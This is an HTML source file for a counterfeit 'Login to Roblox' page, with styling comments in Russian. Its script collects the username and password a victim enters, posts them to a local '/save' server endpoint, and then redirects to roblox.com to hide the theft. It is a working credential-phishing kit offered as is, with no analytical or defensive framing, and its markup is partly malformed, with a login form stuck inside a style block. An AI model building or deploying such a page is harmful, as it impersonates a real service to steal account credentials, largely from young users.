<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Login Page</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body {
        background-color: #0d0d0d;
        font-family: Arial, sans-serif;
        color: white;
        margin: 0;
        padding: 0;
    }

    /* Изображение топ-бара */
    .top-image {
        width: 100%;
        display: block;
    }

    /* Центрирование формы */
    .container {
        display: flex;
        justify-content: center;
        align-items: flex-start;
        height: calc(100vh - 60px);
    }

   <div class="login-box">
    <input type="text" placeholder="Username/Email/Phone">
    <input type="password" placeholder="Password">
    <button>Log In</button>
    <a href="#">Forgot Password or Username?</a>
    <hr>
    <button>Email Me a One-Time Code</button>
    <button>Use Another Device</button>
    <a href="#">Don't have an account? Sign Up</a>
</div>

<style>
body {
    background: #212122;
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}
.login-box {
    background-color: #1f1f20;
    padding: 30px;
    border-radius: 6px;
    width: 380px;
    min-height: 450px; /* Увеличил вертикальную длину */
    box-shadow: 0 0 10px rgba(0,0,0,0.6);
    text-align: center;
    margin-top: 50px;
}


.login-box hr {
    border: none;
    border-top: 1px solid #444; /* серая линия */
    margin: 15px 0;
}


.login-box h2 {
    color: white;
}
.login-box input,
.login-box button {
    width: 100%;
    box-sizing: border-box; /* выравнивает размеры */
    padding: 10px;
    margin: 6px 0;
    border: 1px solid #555;
    border-radius: 4px;
    background: #2b2b2b;
    color: white;
}
.login-box button {
    cursor: pointer;
}
.login-box a {
    color: #00aaff;
    font-size: 12px;
    display: block;
    margin-top: 8px;
    text-decoration: none;
}
</style>

</head>
<body>

<!-- Вставка изображения топ-бара -->
<img src="TOP - bar.png" alt="Top Bar" style="width: 100%;">
<img src="top-bar-low.png" alt="Bottom Bar" style="width: 100%; display: block; position: fixed; bottom: 0; left: 0;">

<div class="container">
    <div class="login-box">
 <h2 style="font-weight: bold; font-size: 28px;">Login to Roblox</h2>


<input type="text" id="username" placeholder="Username/Email/Phone">
<input type="password" id="password" placeholder="Password">
<button id="login-btn">Log In</button>
<a href="#" class="link" style="color: white;">Forgot Password or Username?</a>
<hr>
<button>Email Me a One-Time Code</button>
<button>Use Another Device</button>
<a href="#" class="link" style="color: white;">Don't have an account? Sign Up</a>

    </div>
</div>

<script>
document.getElementById('login-btn').addEventListener('click', function() {
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!username || !password) {
        alert('Please fill in both fields.');
        return;
    }

    fetch('http://localhost:3000/save', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({username, password})
    })
    .then(res => {
        if (res.ok) {
            window.location.href = 'roblox.com';
        } else {
            alert('Server error.');
        }
    })
    .catch(err => {
        alert('Connection error.');
        console.error(err);
    });
});
</script>

</body>
</html>
